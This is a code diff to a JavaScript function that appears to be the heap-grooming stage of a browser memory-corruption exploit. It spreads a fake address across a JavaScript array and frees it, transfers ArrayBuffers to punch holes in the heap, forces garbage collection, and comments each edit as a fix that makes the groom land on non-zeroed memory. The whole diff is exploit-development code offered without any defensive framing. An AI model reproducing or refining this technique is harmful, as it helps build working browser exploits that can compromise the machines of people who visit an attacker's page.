@@ -1044,11 +1044,6 @@ function runGroomAndLoad() {
     try {
         emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
         const channel = new MessageChannel();
-        
-        // FIX: Do NOT close the ports here. 
-        // Closing them before postMessage silently ignores the transfer list,
-        // which no-ops the groom and causes ZERO-HEADER-MISS.
-        // We will close them after the final postMessage.
 
         for (let i = 0; i < DRAIN_COUNT; ++i)
             keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
@@ -1065,18 +1060,25 @@ function runGroomAndLoad() {
         const separator = buffer(SEPARATOR_SIZE);
         const earlyHole = buffer(EARLY_HOLE_SIZE);
         const guard = buffer(GUARD_SIZE);
-        const predecessor = buffer(PREDECESSOR_SIZE);
         const finalHole = buffer(FINAL_HOLE_SIZE);
 
-        fillRawCellPointers(predecessor, fakeAddress);
+        // FIX: Use a JS Array instead of ArrayBuffer. 
+        // JS Arrays are not zeroed on free, unlike ArrayBuffers.
+        let predecessor = new Array(PREDECESSOR_SIZE / 8);
+        for (let i = 0; i < predecessor.length; i++) {
+            predecessor[i] = fakeAddress; 
+        }
+        
         keepAlive[keepIndex++] = separator;
         keepAlive[keepIndex++] = guard;
-        keepAlive[keepIndex++] = predecessor;
+        // DO NOT keep predecessor in keepAlive. We need it to be freed.
+        
         emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
             + `-fake=${hex(fakeAddress)}`);
 
         criticalBarrier(fakeAddress, targetAddress);
 
+        // Free the ArrayBuffers (this creates zeroed holes)
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
             earlyHole, finalHole]);
         if (butterflyHole1.byteLength !== 0 || butterflyHole2.byteLength !== 0
@@ -1088,7 +1090,19 @@ function runGroomAndLoad() {
                 + "," + finalHole.byteLength);
         }
 
-        // FIX: Now that all transfers are queued, we can safely close the ports.
+        // FIX: Free the predecessor array so the SSV allocator reuses its
+        // non-zeroed memory. We null it out and trigger a GC.
+        predecessor = null;
+        try {
+            if (typeof globalThis.gc === "function") {
+                globalThis.gc();
+            } else {
+                // Attempt to force GC by allocating and dropping a large object
+                let temp = new ArrayBuffer(0x1000000);
+                temp = null;
+            }
+        } catch(e) { console.warn("[core] GC trigger threw:", e); }
+
         channel.port1.close();
         channel.port2.close();
 
